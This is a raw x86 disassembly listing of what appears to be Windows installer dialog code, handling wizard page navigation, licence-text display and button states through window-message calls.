  4041b0:	ff 35 08 8a 42 00    	push   0x428a08
  4041b6:	6a f2                	push   $0xfffffff2
  4041b8:	57                   	push   %edi
  4041b9:	ff 15 dc 81 40 00    	call   *0x4081dc
  4041bf:	6a 04                	push   $0x4
  4041c1:	e8 45 d2 ff ff       	call   0x40140b
  4041c6:	a3 ec 89 42 00       	mov    %eax,0x4289ec
  4041cb:	33 c0                	xor    %eax,%eax
  4041cd:	40                   	inc    %eax
  4041ce:	a3 f0 2e 42 00       	mov    %eax,0x422ef0
  4041d3:	8b 0d 60 a3 40 00    	mov    0x40a360,%ecx
  4041d9:	33 ed                	xor    %ebp,%ebp
  4041db:	8b f1                	mov    %ecx,%esi
  4041dd:	c1 e6 06             	shl    $0x6,%esi
  4041e0:	03 35 40 9a 42 00    	add    0x429a40,%esi
  4041e6:	3b cd                	cmp    %ebp,%ecx
  4041e8:	7c 3e                	jl     0x404228
  4041ea:	83 f8 01             	cmp    $0x1,%eax
  4041ed:	75 31                	jne    0x404220
  4041ef:	55                   	push   %ebp
  4041f0:	ff 76 10             	push   0x10(%esi)
  4041f3:	e8 91 d1 ff ff       	call   0x401389
  4041f8:	85 c0                	test   %eax,%eax
  4041fa:	74 24                	je     0x404220
  4041fc:	6a 01                	push   $0x1
  4041fe:	55                   	push   %ebp
  4041ff:	68 0f 04 00 00       	push   $0x40f
  404204:	ff 35 f8 89 42 00    	push   0x4289f8
  40420a:	ff 15 58 82 40 00    	call   *0x408258
  404210:	33 c0                	xor    %eax,%eax
  404212:	39 2d ec 89 42 00    	cmp    %ebp,0x4289ec
  404218:	0f 94 c0             	sete   %al
  40421b:	e9 aa 02 00 00       	jmp    0x4044ca
  404220:	39 2e                	cmp    %ebp,(%esi)
  404222:	0f 84 a0 02 00 00    	je     0x4044c8
  404228:	68 0b 04 00 00       	push   $0x40b
  40422d:	e8 15 03 00 00       	call   0x404547
  404232:	a1 f0 2e 42 00       	mov    0x422ef0,%eax
  404237:	01 05 60 a3 40 00    	add    %eax,0x40a360
  40423d:	c1 e0 06             	shl    $0x6,%eax
  404240:	03 f0                	add    %eax,%esi
  404242:	a1 60 a3 40 00       	mov    0x40a360,%eax
  404247:	3b 05 44 9a 42 00    	cmp    0x429a44,%eax
  40424d:	75 07                	jne    0x404256
  40424f:	6a 01                	push   $0x1
  404251:	e8 b5 d1 ff ff       	call   0x40140b
  404256:	39 2d ec 89 42 00    	cmp    %ebp,0x4289ec
  40425c:	0f 85 24 02 00 00    	jne    0x404486
  404262:	a1 44 9a 42 00       	mov    0x429a44,%eax
  404267:	39 05 60 a3 40 00    	cmp    %eax,0x40a360
  40426d:	0f 83 13 02 00 00    	jae    0x404486
  404273:	ff 76 24             	push   0x24(%esi)
  404276:	8b 5e 14             	mov    0x14(%esi),%ebx
  404279:	68 00 90 43 00       	push   $0x439000
  40427e:	e8 36 23 00 00       	call   0x4065b9
  404283:	ff 76 20             	push   0x20(%esi)
  404286:	68 19 fc ff ff       	push   $0xfffffc19
  40428b:	57                   	push   %edi
  40428c:	e8 6a 02 00 00       	call   0x4044fb
  404291:	ff 76 1c             	push   0x1c(%esi)
  404294:	68 1b fc ff ff       	push   $0xfffffc1b
  404299:	57                   	push   %edi
  40429a:	e8 5c 02 00 00       	call   0x4044fb
  40429f:	ff 76 28             	push   0x28(%esi)
  4042a2:	68 1a fc ff ff       	push   $0xfffffc1a
  4042a7:	57                   	push   %edi
  4042a8:	e8 4e 02 00 00       	call   0x4044fb
  4042ad:	6a 03                	push   $0x3
  4042af:	57                   	push   %edi
  4042b0:	ff 15 3c 82 40 00    	call   *0x40823c
  4042b6:	39 2d ac 9a 42 00    	cmp    %ebp,0x429aac
  4042bc:	89 44 24 30          	mov    %eax,0x30(%esp)
  4042c0:	74 08                	je     0x4042ca
  4042c2:	66 81 e3 fd fe       	and    $0xfefd,%bx
  4042c7:	83 cb 04             	or     $0x4,%ebx
  4042ca:	8b cb                	mov    %ebx,%ecx
  4042cc:	83 e1 08             	and    $0x8,%ecx
  4042cf:	51                   	push   %ecx
  4042d0:	50                   	push   %eax
  4042d1:	ff 15 28 82 40 00    	call   *0x408228
  4042d7:	8b c3                	mov    %ebx,%eax
  4042d9:	25 00 01 00 00       	and    $0x100,%eax
  4042de:	50                   	push   %eax
  4042df:	ff 74 24 34          	push   0x34(%esp)
  4042e3:	ff 15 50 82 40 00    	call   *0x408250
  4042e9:	8b c3                	mov    %ebx,%eax
  4042eb:	83 e0 02             	and    $0x2,%eax
  4042ee:	50                   	push   %eax
  4042ef:	e8 29 02 00 00       	call   0x40451d
  4042f4:	83 e3 04             	and    $0x4,%ebx
  4042f7:	53                   	push   %ebx
  4042f8:	ff 35 d0 0e 42 00    	push   0x420ed0
  4042fe:	ff 15 50 82 40 00    	call   *0x408250
  404304:	3b dd                	cmp    %ebp,%ebx
  404306:	74 03                	je     0x40430b
  404308:	55                   	push   %ebp
  404309:	eb 02                	jmp    0x40430d
  40430b:	6a 01                	push   $0x1
  40430d:	68 60 f0 00 00       	push   $0xf060
  404312:	55                   	push   %ebp
  404313:	57                   	push   %edi
  404314:	ff 15 e0 81 40 00    	call   *0x4081e0
  40431a:	50                   	push   %eax
  40431b:	ff 15 e4 81 40 00    	call   *0x4081e4
  404321:	8b 1d 58 82 40 00    	mov    0x408258,%ebx
  404327:	6a 01                	push   $0x1
  404329:	55                   	push   %ebp
  40432a:	68 f4 00 00 00       	push   $0xf4
  40432f:	ff 74 24 3c          	push   0x3c(%esp)
  404333:	ff d3                	call   *%ebx
  404335:	39 2d ac 9a 42 00    	cmp    %ebp,0x429aac
  40433b:	74 13                	je     0x404350
  40433d:	55                   	push   %ebp
  40433e:	6a 02                	push   $0x2
  404340:	68 01 04 00 00       	push   $0x401
  404345:	57                   	push   %edi
  404346:	ff d3                	call   *%ebx
  404348:	ff 35 d0 0e 42 00    	push   0x420ed0
  40434e:	eb 06                	jmp    0x404356
  404350:	ff 35 04 2f 42 00    	push   0x422f04
  404356:	e8 d5 01 00 00       	call   0x404530
  40435b:	e8 7d fc ff ff       	call   0x403fdd
  404360:	bb 08 2f 42 00       	mov    $0x422f08,%ebx
  404365:	50                   	push   %eax
  404366:	53                   	push   %ebx
  404367:	e8 10 22 00 00       	call   0x40657c
  40436c:	ff 76 18             	push   0x18(%esi)
  40436f:	53                   	push   %ebx
  404370:	e8 1d 22 00 00       	call   0x406592
  404375:	8d 04 45 08 2f 42 00 	lea    0x422f08(,%eax,2),%eax
  40437c:	50                   	push   %eax
  40437d:	e8 37 22 00 00       	call   0x4065b9
  404382:	53                   	push   %ebx
  404383:	57                   	push   %edi
  404384:	ff 15 1c 82 40 00    	call   *0x40821c
  40438a:	55                   	push   %ebp
  40438b:	ff 76 08             	push   0x8(%esi)
  40438e:	e8 f6 cf ff ff       	call   0x401389
  404393:	85 c0                	test   %eax,%eax
  404395:	0f 85 97 fe ff ff    	jne    0x404232
  40439b:	39 2e                	cmp    %ebp,(%esi)
  40439d:	0f 84 8f fe ff ff    	je     0x404232
  4043a3:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  4043a7:	75 1d                	jne    0x4043c6
  4043a9:	39 2d ac 9a 42 00    	cmp    %ebp,0x429aac
  4043af:	0f 85 13 01 00 00    	jne    0x4044c8
  4043b5:	39 2d a0 9a 42 00    	cmp    %ebp,0x429aa0
  4043bb:	0f 85 71 fe ff ff    	jne    0x404232
  4043c1:	e9 02 01 00 00       	jmp    0x4044c8
  4043c6:	ff 35 f8 89 42 00    	push   0x4289f8
  4043cc:	ff 15 10 82 40 00    	call   *0x408210
  4043d2:	89 35 e0 1e 42 00    	mov    %esi,0x421ee0
  4043d8:	39 2e                	cmp    %ebp,(%esi)
  4043da:	0f 8e c5 00 00 00    	jle    0x4044a5
  4043e0:	8b 46 04             	mov    0x4(%esi),%eax
  4043e3:	56                   	push   %esi
  4043e4:	ff 34 85 64 a3 40 00 	push   0x40a364(,%eax,4)
  4043eb:	66 8b 06             	mov    (%esi),%ax
  4043ee:	66 03 05 00 8a 42 00 	add    0x428a00,%ax
  4043f5:	57                   	push   %edi
  4043f6:	0f b7 c0             	movzwl %ax,%eax
  4043f9:	50                   	push   %eax
  4043fa:	ff 35 20 9a 42 00    	push   0x429a20
  404400:	ff 15 14 82 40 00    	call   *0x408214
  404406:	3b c5                	cmp    %ebp,%eax
  404408:	a3 f8 89 42 00       	mov    %eax,0x4289f8
  40440d:	0f 84 92 00 00 00    	je     0x4044a5
  404413:	ff 76 2c             	push   0x2c(%esi)
  404416:	6a 06                	push   $0x6
  404418:	50                   	push   %eax
  404419:	e8 dd 00 00 00       	call   0x4044fb
  40441e:	8d 44 24 10          	lea    0x10(%esp),%eax
  404422:	50                   	push   %eax
  404423:	68 fa 03 00 00       	push   $0x3fa
  404428:	57                   	push   %edi
  404429:	ff 15 3c 82 40 00    	call   *0x40823c
  40442f:	50                   	push   %eax
  404430:	ff 15 e8 81 40 00    	call   *0x4081e8
  404436:	8d 44 24 10          	lea    0x10(%esp),%eax
  40443a:	50                   	push   %eax
  40443b:	57                   	push   %edi
  40443c:	ff 15 ec 81 40 00    	call   *0x4081ec
  404442:	6a 15                	push   $0x15
  404444:	55                   	push   %ebp
  404445:	55                   	push   %ebp
  404446:	ff 74 24 20          	push   0x20(%esp)
  40444a:	ff 74 24 20          	push   0x20(%esp)
  40444e:	55                   	push   %ebp
  40444f:	ff 35 f8 89 42 00    	push   0x4289f8
  404455:	ff 15 d0 81 40 00    	call   *0x4081d0
  40445b:	55                   	push   %ebp
  40445c:	ff 76 0c             	push   0xc(%esi)
  40445f:	e8 25 cf ff ff       	call   0x401389
  404464:	39 2d ec 89 42 00    	cmp    %ebp,0x4289ec
  40446a:	75 5c                	jne    0x4044c8
  40446c:	6a 08                	push   $0x8
  40446e:	ff 35 f8 89 42 00    	push   0x4289f8
  404474:	ff 15 28 82 40 00    	call   *0x408228
  40447a:	68 05 04 00 00       	push   $0x405
  40447f:	e8 c3 00 00 00       	call   0x404547
  404484:	eb 1f                	jmp    0x4044a5
  404486:	ff 35 f8 89 42 00    	push   0x4289f8
  40448c:	ff 15 10 82 40 00    	call   *0x408210
  404492:	ff 35 d8 16 42 00    	push   0x4216d8
  404498:	89 2d 28 9a 42 00    	mov    %ebp,0x429a28
  40449e:	57                   	push   %edi
  40449f:	ff 15 f0 81 40 00    	call   *0x4081f0
  4044a5:	39 2d 08 4f 42 00    	cmp    %ebp,0x424f08
  4044ab:	75 1b                	jne    0x4044c8
  4044ad:	39 2d f8 89 42 00    	cmp    %ebp,0x4289f8
  4044b3:	74 13                	je     0x4044c8
  4044b5:	6a 0a                	push   $0xa
  4044b7:	57                   	push   %edi
  4044b8:	ff 15 28 82 40 00    	call   *0x408228
  4044be:	c7 05 08 4f 42 00 01 	movl   $0x1,0x424f08
  4044c5:	00 00 00 
  4044c8:	33 c0                	xor    %eax,%eax
  4044ca:	5f                   	pop    %edi
  4044cb:	5e                   	pop    %esi
  4044cc:	5d                   	pop    %ebp
  4044cd:	5b                   	pop    %ebx
  4044ce:	83 c4 10             	add    $0x10,%esp
  4044d1:	c2 10 00             	ret    $0x10
  4044d4:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  4044d9:	75 06                	jne    0x4044e1
  4044db:	ff 05 ec 89 42 00    	incl   0x4289ec
  4044e1:	6a 00                	push   $0x0
  4044e3:	ff 74 24 08          	push   0x8(%esp)
  4044e7:	68 08 04 00 00       	push   $0x408
  4044ec:	ff 35 28 9a 42 00    	push   0x429a28
  4044f2:	ff 15 58 82 40 00    	call   *0x408258
  4044f8:	c2 04 00             	ret    $0x4
  4044fb:	ff 74 24 0c          	push   0xc(%esp)
  4044ff:	6a 00                	push   $0x0
  404501:	e8 b3 20 00 00       	call   0x4065b9
  404506:	50                   	push   %eax
  404507:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40450b:	05 e8 03 00 00       	add    $0x3e8,%eax
  404510:	50                   	push   %eax
  404511:	ff 74 24 0c          	push   0xc(%esp)
  404515:	e8 a0 16 00 00       	call   0x405bba
  40451a:	c2 0c 00             	ret    $0xc
  40451d:	ff 74 24 04          	push   0x4(%esp)
  404521:	ff 35 04 2f 42 00    	push   0x422f04
  404527:	ff 15 50 82 40 00    	call   *0x408250
  40452d:	c2 04 00             	ret    $0x4
  404530:	6a 01                	push   $0x1
  404532:	ff 74 24 08          	push   0x8(%esp)
  404536:	6a 28                	push   $0x28
  404538:	ff 35 28 9a 42 00    	push   0x429a28
  40453e:	ff 15 58 82 40 00    	call   *0x408258
  404544:	c2 04 00             	ret    $0x4
  404547:	a1 f8 89 42 00       	mov    0x4289f8,%eax
  40454c:	85 c0                	test   %eax,%eax
  40454e:	74 0f                	je     0x40455f
  404550:	6a 00                	push   $0x0
  404552:	6a 00                	push   $0x0
  404554:	ff 74 24 0c          	push   0xc(%esp)
  404558:	50                   	push   %eax
  404559:	ff 15 58 82 40 00    	call   *0x408258
  40455f:	c2 04 00             	ret    $0x4
  404562:	55                   	push   %ebp
  404563:	8b ec                	mov    %esp,%ebp
  404565:	83 ec 0c             	sub    $0xc,%esp
  404568:	8b 45 08             	mov    0x8(%ebp),%eax
  40456b:	56                   	push   %esi
  40456c:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  404571:	83 f8 05             	cmp    $0x5,%eax
  404574:	0f 87 b0 00 00 00    	ja     0x40462a
  40457a:	6a eb                	push   $0xffffffeb
  40457c:	ff 75 10             	push   0x10(%ebp)
  40457f:	ff 15 d4 81 40 00    	call   *0x4081d4
  404585:	8b f0                	mov    %eax,%esi
  404587:	85 f6                	test   %esi,%esi
  404589:	0f 84 9b 00 00 00    	je     0x40462a
  40458f:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  404593:	0f 87 91 00 00 00    	ja     0x40462a
  404599:	83 7e 10 02          	cmpl   $0x2,0x10(%esi)
  40459d:	0f 87 87 00 00 00    	ja     0x40462a
  4045a3:	8b 4e 14             	mov    0x14(%esi),%ecx
  4045a6:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  4045ac:	75 7c                	jne    0x40462a
  4045ae:	8b 06                	mov    (%esi),%eax
  4045b0:	57                   	push   %edi
  4045b1:	8b 3d cc 81 40 00    	mov    0x4081cc,%edi
  4045b7:	f6 c1 02             	test   $0x2,%cl
  4045ba:	74 03                	je     0x4045bf
  4045bc:	50                   	push   %eax
  4045bd:	ff d7                	call   *%edi
  4045bf:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  4045c3:	74 0a                	je     0x4045cf
  4045c5:	50                   	push   %eax
  4045c6:	ff 75 0c             	push   0xc(%ebp)
  4045c9:	ff 15 64 80 40 00    	call   *0x408064
  4045cf:	ff 76 10             	push   0x10(%esi)
  4045d2:	ff 75 0c             	push   0xc(%ebp)
  4045d5:	ff 15 60 80 40 00    	call   *0x408060
  4045db:	8b 46 04             	mov    0x4(%esi),%eax
  4045de:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  4045e2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4045e5:	74 06                	je     0x4045ed
  4045e7:	50                   	push   %eax
  4045e8:	ff d7                	call   *%edi
  4045ea:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4045ed:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  4045f1:	5f                   	pop    %edi
  4045f2:	74 0a                	je     0x4045fe
  4045f4:	50                   	push   %eax
  4045f5:	ff 75 0c             	push   0xc(%ebp)
  4045f8:	ff 15 4c 80 40 00    	call   *0x40804c
  4045fe:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  404602:	74 21                	je     0x404625
  404604:	8b 46 08             	mov    0x8(%esi),%eax
  404607:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40460a:	8b 46 0c             	mov    0xc(%esi),%eax
  40460d:	85 c0                	test   %eax,%eax
  40460f:	74 07                	je     0x404618
  404611:	50                   	push   %eax
  404612:	ff 15 54 80 40 00    	call   *0x408054
  404618:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40461b:	50                   	push   %eax
  40461c:	ff 15 58 80 40 00    	call   *0x408058
  404622:	89 46 0c             	mov    %eax,0xc(%esi)
  404625:	8b 46 0c             	mov    0xc(%esi),%eax
  404628:	eb 02                	jmp    0x40462c
  40462a:	33 c0                	xor    %eax,%eax
  40462c:	5e                   	pop    %esi
  40462d:	c9                   	leave
  40462e:	c2 0c 00             	ret    $0xc
  404631:	55                   	push   %ebp
  404632:	8b ec                	mov    %esp,%ebp
  404634:	8b 45 10             	mov    0x10(%ebp),%eax
  404637:	8b 0d d4 0e 42 00    	mov    0x420ed4,%ecx
  40463d:	d1 e8                	shr    $1,%eax
  40463f:	50                   	push   %eax
  404640:	8b 45 08             	mov    0x8(%ebp),%eax
  404643:	03 c8                	add    %eax,%ecx
  404645:	51                   	push   %ecx
  404646:	ff 75 0c             	push   0xc(%ebp)
  404649:	ff 15 98 80 40 00    	call   *0x408098
  40464f:	ff 75 0c             	push   0xc(%ebp)
  404652:	ff 15 9c 80 40 00    	call   *0x40809c
  404658:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40465b:	03 c0                	add    %eax,%eax
  40465d:	89 01                	mov    %eax,(%ecx)
  40465f:	01 05 d4 0e 42 00    	add    %eax,0x420ed4
  404665:	33 c0                	xor    %eax,%eax
  404667:	5d                   	pop    %ebp
  404668:	c2 10 00             	ret    $0x10
  40466b:	55                   	push   %ebp
  40466c:	8b ec                	mov    %esp,%ebp
  40466e:	a1 d4 0e 42 00       	mov    0x420ed4,%eax
  404673:	56                   	push   %esi
  404674:	8b 75 08             	mov    0x8(%ebp),%esi
  404677:	8d 04 46             	lea    (%esi,%eax,2),%eax
  40467a:	50                   	push   %eax
  40467b:	ff 15 9c 80 40 00    	call   *0x40809c
  404681:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404684:	d1 e9                	shr    $1,%ecx
  404686:	3b c1                	cmp    %ecx,%eax
  404688:	72 02                	jb     0x40468c
  40468a:	8b c1                	mov    %ecx,%eax
  40468c:	33 c9                	xor    %ecx,%ecx
  40468e:	51                   	push   %ecx
  40468f:	51                   	push   %ecx
  404690:	ff 75 10             	push   0x10(%ebp)
  404693:	ff 75 0c             	push   0xc(%ebp)
  404696:	50                   	push   %eax
  404697:	a1 d4 0e 42 00       	mov    0x420ed4,%eax
  40469c:	8d 04 46             	lea    (%esi,%eax,2),%eax
  40469f:	50                   	push   %eax
  4046a0:	51                   	push   %ecx
  4046a1:	51                   	push   %ecx
  4046a2:	ff 15 94 80 40 00    	call   *0x408094
  4046a8:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4046ab:	5e                   	pop    %esi
  4046ac:	89 01                	mov    %eax,(%ecx)
  4046ae:	01 05 d4 0e 42 00    	add    %eax,0x420ed4
  4046b4:	33 c0                	xor    %eax,%eax
  4046b6:	5d                   	pop    %ebp
  4046b7:	c2 10 00             	ret    $0x10
  4046ba:	55                   	push   %ebp
  4046bb:	8b ec                	mov    %esp,%ebp
  4046bd:	83 ec 0c             	sub    $0xc,%esp
  4046c0:	53                   	push   %ebx
  4046c1:	33 db                	xor    %ebx,%ebx
  4046c3:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4046ca:	56                   	push   %esi
  4046cb:	57                   	push   %edi
  4046cc:	0f 85 1a 01 00 00    	jne    0x4047ec
  4046d2:	8b 7d 14             	mov    0x14(%ebp),%edi
  4046d5:	8b 47 30             	mov    0x30(%edi),%eax
  4046d8:	3b c3                	cmp    %ebx,%eax
  4046da:	7d 11                	jge    0x4046ed
  4046dc:	8b 0d fc 89 42 00    	mov    0x4289fc,%ecx
  4046e2:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  4046e9:	2b c8                	sub    %eax,%ecx
  4046eb:	8b 01                	mov    (%ecx),%eax
  4046ed:	8b 0d 58 9a 42 00    	mov    0x429a58,%ecx
  4046f3:	8d 04 41             	lea    (%ecx,%eax,2),%eax
  4046f6:	0f b7 08             	movzwl (%eax),%ecx
  4046f9:	40                   	inc    %eax
  4046fa:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  4046fd:	40                   	inc    %eax
  4046fe:	83 f9 02             	cmp    $0x2,%ecx
  404701:	89 45 14             	mov    %eax,0x14(%ebp)
  404704:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404707:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40470a:	c7 45 fc 6b 46 40 00 	movl   $0x40466b,-0x4(%ebp)
  404711:	74 07                	je     0x40471a
  404713:	c7 45 fc 31 46 40 00 	movl   $0x404631,-0x4(%ebp)
  40471a:	8b 47 14             	mov    0x14(%edi),%eax
  40471d:	ff 77 34             	push   0x34(%edi)
  404720:	8b f0                	mov    %eax,%esi
  404722:	83 e0 01             	and    $0x1,%eax
  404725:	f7 d6                	not    %esi
  404727:	c1 ee 05             	shr    $0x5,%esi
  40472a:	6a 22                	push   $0x22
  40472c:	83 e6 01             	and    $0x1,%esi
  40472f:	ff 75 08             	push   0x8(%ebp)
  404732:	0b f0                	or     %eax,%esi
  404734:	e8 c2 fd ff ff       	call   0x4044fb
  404739:	ff 77 38             	push   0x38(%edi)
  40473c:	6a 23                	push   $0x23
  40473e:	ff 75 08             	push   0x8(%ebp)
  404741:	e8 b5 fd ff ff       	call   0x4044fb
  404746:	33 c0                	xor    %eax,%eax
  404748:	3b f3                	cmp    %ebx,%esi
  40474a:	0f 94 c0             	sete   %al
  40474d:	05 0a 04 00 00       	add    $0x40a,%eax
  404752:	6a 01                	push   $0x1
  404754:	50                   	push   %eax
  404755:	ff 75 08             	push   0x8(%ebp)
  404758:	ff 15 c0 81 40 00    	call   *0x4081c0
  40475e:	56                   	push   %esi
  40475f:	e8 b9 fd ff ff       	call   0x40451d
  404764:	68 e8 03 00 00       	push   $0x3e8
  404769:	ff 75 08             	push   0x8(%ebp)
  40476c:	ff 15 3c 82 40 00    	call   *0x40823c
  404772:	8b f8                	mov    %eax,%edi
  404774:	57                   	push   %edi
  404775:	e8 b6 fd ff ff       	call   0x404530
  40477a:	8b 35 58 82 40 00    	mov    0x408258,%esi
  404780:	53                   	push   %ebx
  404781:	6a 01                	push   $0x1
  404783:	68 5b 04 00 00       	push   $0x45b
  404788:	57                   	push   %edi
  404789:	ff d6                	call   *%esi
  40478b:	a1 30 9a 42 00       	mov    0x429a30,%eax
  404790:	8b 40 68             	mov    0x68(%eax),%eax
  404793:	3b c3                	cmp    %ebx,%eax
  404795:	7d 09                	jge    0x4047a0
  404797:	f7 d8                	neg    %eax
  404799:	50                   	push   %eax
  40479a:	ff 15 cc 81 40 00    	call   *0x4081cc
  4047a0:	50                   	push   %eax
  4047a1:	53                   	push   %ebx
  4047a2:	68 43 04 00 00       	push   $0x443
  4047a7:	57                   	push   %edi
  4047a8:	ff d6                	call   *%esi
  4047aa:	68 00 00 01 04       	push   $0x4010000
  4047af:	53                   	push   %ebx
  4047b0:	68 45 04 00 00       	push   $0x445
  4047b5:	57                   	push   %edi
  4047b6:	ff d6                	call   *%esi
  4047b8:	ff 75 14             	push   0x14(%ebp)
  4047bb:	e8 d2 1d 00 00       	call   0x406592
  4047c0:	50                   	push   %eax
  4047c1:	53                   	push   %ebx
  4047c2:	68 35 04 00 00       	push   $0x435
  4047c7:	57                   	push   %edi
  4047c8:	ff d6                	call   *%esi
  4047ca:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4047cd:	89 1d d4 0e 42 00    	mov    %ebx,0x420ed4
  4047d3:	50                   	push   %eax
  4047d4:	ff 75 0c             	push   0xc(%ebp)
  4047d7:	68 49 04 00 00       	push   $0x449
  4047dc:	57                   	push   %edi
  4047dd:	ff d6                	call   *%esi
  4047df:	89 1d d4 0e 42 00    	mov    %ebx,0x420ed4
  4047e5:	33 c0                	xor    %eax,%eax
  4047e7:	e9 52 01 00 00       	jmp    0x40493e
  4047ec:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  4047f3:	8b 35 58 82 40 00    	mov    0x408258,%esi
  4047f9:	75 5b                	jne    0x404856
  4047fb:	8b 45 10             	mov    0x10(%ebp),%eax
  4047fe:	c1 e8 10             	shr    $0x10,%eax
  404801:	66 85 c0             	test   %ax,%ax
  404804:	0f 85 25 01 00 00    	jne    0x40492f
  40480a:	39 1d d4 0e 42 00    	cmp    %ebx,0x420ed4
  404810:	0f 85 19 01 00 00    	jne    0x40492f
  404816:	a1 e0 1e 42 00       	mov    0x421ee0,%eax
  40481b:	8d 78 14             	lea    0x14(%eax),%edi
  40481e:	f6 07 20             	testb  $0x20,(%edi)
  404821:	0f 84 08 01 00 00    	je     0x40492f
  404827:	53                   	push   %ebx
  404828:	53                   	push   %ebx
  404829:	68 f0 00 00 00       	push   $0xf0
  40482e:	68 0a 04 00 00       	push   $0x40a
  404833:	ff 75 08             	push   0x8(%ebp)
  404836:	ff 15 3c 82 40 00    	call   *0x40823c
  40483c:	50                   	push   %eax
  40483d:	ff d6                	call   *%esi
  40483f:	8b 0f                	mov    (%edi),%ecx
  404841:	83 e0 01             	and    $0x1,%eax
  404844:	83 e1 fe             	and    $0xfffffffe,%ecx
  404847:	50                   	push   %eax
  404848:	0b c8                	or     %eax,%ecx
  40484a:	89 0f                	mov    %ecx,(%edi)
  40484c:	e8 cc fc ff ff       	call   0x40451d
  404851:	e8 ef 00 00 00       	call   0x404945
  404856:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  40485a:	0f 85 c0 00 00 00    	jne    0x404920
  404860:	68 e8 03 00 00       	push   $0x3e8
  404865:	ff 75 08             	push   0x8(%ebp)
  404868:	ff 15 3c 82 40 00    	call   *0x40823c
  40486e:	8b 7d 14             	mov    0x14(%ebp),%edi
  404871:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  404878:	75 67                	jne    0x4048e1
  40487a:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  404881:	75 5e                	jne    0x4048e1
  404883:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  404886:	8b 57 18             	mov    0x18(%edi),%edx
  404889:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40488c:	2b ca                	sub    %edx,%ecx
  40488e:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  404894:	89 55 f4             	mov    %edx,-0xc(%ebp)
  404897:	c7 45 fc c0 79 42 00 	movl   $0x4279c0,-0x4(%ebp)
  40489e:	73 41                	jae    0x4048e1
  4048a0:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4048a3:	51                   	push   %ecx
  4048a4:	53                   	push   %ebx
  4048a5:	68 4b 04 00 00       	push   $0x44b
  4048aa:	50                   	push   %eax
  4048ab:	ff d6                	call   *%esi
  4048ad:	8b 3d c4 81 40 00    	mov    0x4081c4,%edi
  4048b3:	68 02 7f 00 00       	push   $0x7f02
  4048b8:	53                   	push   %ebx
  4048b9:	ff d7                	call   *%edi
  4048bb:	50                   	push   %eax
  4048bc:	ff 15 c8 81 40 00    	call   *0x4081c8
  4048c2:	6a 01                	push   $0x1
  4048c4:	ff 75 fc             	push   -0x4(%ebp)
  4048c7:	ff 75 08             	push   0x8(%ebp)
  4048ca:	e8 9a 00 00 00       	call   0x404969
  4048cf:	68 00 7f 00 00       	push   $0x7f00
  4048d4:	53                   	push   %ebx
  4048d5:	ff d7                	call   *%edi
  4048d7:	50                   	push   %eax
  4048d8:	ff 15 c8 81 40 00    	call   *0x4081c8
  4048de:	8b 7d 14             	mov    0x14(%ebp),%edi
  4048e1:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  4048e8:	75 48                	jne    0x404932
  4048ea:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  4048f1:	75 3f                	jne    0x404932
  4048f3:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  4048f7:	75 10                	jne    0x404909
  4048f9:	53                   	push   %ebx
  4048fa:	6a 01                	push   $0x1
  4048fc:	68 11 01 00 00       	push   $0x111
  404901:	ff 35 28 9a 42 00    	push   0x429a28
  404907:	ff d6                	call   *%esi
  404909:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  40490d:	75 0c                	jne    0x40491b
  40490f:	53                   	push   %ebx
  404910:	53                   	push   %ebx
  404911:	6a 10                	push   $0x10
  404913:	ff 35 28 9a 42 00    	push   0x429a28
  404919:	ff d6                	call   *%esi
  40491b:	33 c0                	xor    %eax,%eax
  40491d:	40                   	inc    %eax
  40491e:	eb 1e                	jmp    0x40493e
  404920:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404927:	75 06                	jne    0x40492f
  404929:	ff 05 d4 0e 42 00    	incl   0x420ed4
  40492f:	8b 7d 14             	mov    0x14(%ebp),%edi
  404932:	57                   	push   %edi
  404933:	ff 75 10             	push   0x10(%ebp)
  404936:	ff 75 0c             	push   0xc(%ebp)
  404939:	e8 24 fc ff ff       	call   0x404562
  40493e:	5f                   	pop    %edi
  40493f:	5e                   	pop    %esi
  404940:	5b                   	pop    %ebx
  404941:	c9                   	leave
  404942:	c2 10 00             	ret    $0x10
  404945:	83 3d ac 9a 42 00 00 	cmpl   $0x0,0x429aac
  40494c:	a1 d0 0e 42 00       	mov    0x420ed0,%eax
  404951:	75 05                	jne    0x404958
  404953:	a1 04 2f 42 00       	mov    0x422f04,%eax
  404958:	6a 01                	push   $0x1
  40495a:	6a 01                	push   $0x1
  40495c:	68 f4 00 00 00       	push   $0xf4
  404961:	50                   	push   %eax
  404962:	ff 15 58 82 40 00    	call   *0x408258
  404968:	c3                   	ret
  404969:	55                   	push   %ebp
  40496a:	8b ec                	mov    %esp,%ebp
